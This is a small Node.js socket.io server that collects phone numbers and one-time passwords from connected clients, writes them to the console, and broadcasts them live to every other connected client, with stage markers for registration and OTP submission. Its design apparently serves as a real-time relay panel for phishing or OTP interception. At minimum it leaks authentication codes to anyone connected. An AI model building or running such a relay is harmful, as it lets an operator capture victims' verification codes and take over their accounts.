require('dotenv').config();
const http = require('http');
const socketIo = require('socket.io');

const allowedOrigin = process.env.ALLOWED_ORIGIN || 'http://localhost:5173';

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Socket.io server running!');
});

const io = socketIo(server, {
    cors: {
        origin: allowedOrigin,
        methods: ['GET', 'POST'],
        allowedHeaders: ['my-custom-header'],
        credentials: true,
    }
});



io.on('connection', (socket) => {
    let phone, otp;
    console.log('a user connected', socket.handshake.query);
    socket.on('verify-from-review',(msg)=>{
        socket.broadcast.emit('verify-to-auth', msg);
    })
    socket.on('message', (msg) => {
        console.log('Received message: ' + msg);
        if(msg.type === 'phone'){
            phone = msg.value;
        }
        else if(msg.type === 'otp'){
            otp = msg.value;
        }else if(msg.type === 'registered'){
            phone = phone + " - 🚀"
        }else if(msg.type === 'otpsubmit'){
            otp = otp + " - 🚀"
        }
        console.log('phone-',phone );
        console.log('otp-', otp ); 
        socket.broadcast.emit('message', {
            phone,
            otp
        });
    });

    socket.on('disconnect', () => {
        console.log('user disconnected');
    });
});

server.listen(3000, () => {
    console.log('HTTP Server listening on port 3000');
});
